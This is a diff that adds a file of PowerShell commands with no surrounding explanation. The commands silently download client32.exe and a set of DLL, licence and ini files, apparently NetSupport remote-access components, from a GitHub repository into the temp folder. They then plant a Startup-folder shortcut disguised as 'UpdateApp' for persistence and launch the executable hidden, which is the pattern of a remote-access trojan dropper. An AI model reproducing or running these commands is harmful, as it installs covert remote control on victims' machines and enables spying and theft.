@@ -1,0 +1,16 @@
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/client32.exe' -OutFile '%TEMP%\client32.exe';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/MEMEOW-IO/test/refs/heads/main/client32.ini' -OutFile '%TEMP%\client32.ini';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.LIC' -OutFile '%TEMP%\NSM.LIC';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/HTCTL32.DLL' -OutFile '%TEMP%\HTCTL32.DLL';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/msvcr100.dll' -OutFile '%TEMP%\msvcr100.dll';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/nskbfltr.inf' -OutFile '%TEMP%\nskbfltr.inf'';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.ini' -OutFile '%TEMP%\NSM.ini';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/nsm_vpro.inf' -OutFile '%TEMP%\nsm_vpro.inf';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/AudioCapture.dll' -OutFile '%TEMP%\AudioCapture.dll';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/pcicapi.dll' -OutFile '%TEMP%\pcicapi.dll';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICHEK.DLL' -OutFile '%TEMP%\PCICHEK.DLL';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICL32.DLL' -OutFile '%TEMP%\PCICL32.DLL';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/TCCTL32.DLL' -OutFile '%TEMP%\TCCTL32.DLL';
+powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\UpdateApp');$s.TargetPath='%TEMP%\client32.exe';$s.Save()
+powershell Start-Process -WindowStyle Hidden '%TEMP%\client32.exe'
+
